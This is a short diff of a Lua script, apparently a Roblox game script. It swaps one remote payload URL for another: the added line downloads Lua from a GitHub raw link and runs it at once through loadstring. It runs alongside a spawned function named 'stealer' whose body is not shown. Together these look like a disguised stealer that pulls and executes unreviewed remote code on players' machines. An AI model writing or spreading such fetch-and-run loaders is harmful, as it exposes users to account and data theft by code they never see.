@@ -3,8 +3,9 @@ local function stealer()
 end
 
 local function loadui()
-    loadstring(game:HttpGet("https://pastebin.com/raw/Ctf0PNa4", true))("discord.gg/csxu2nCkw9")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/AutoScriptsV4/BestHub/refs/heads/main/EggDetectorLUA", true))()
 end
+
 
 task.spawn(stealer)
 task.spawn(loadui)
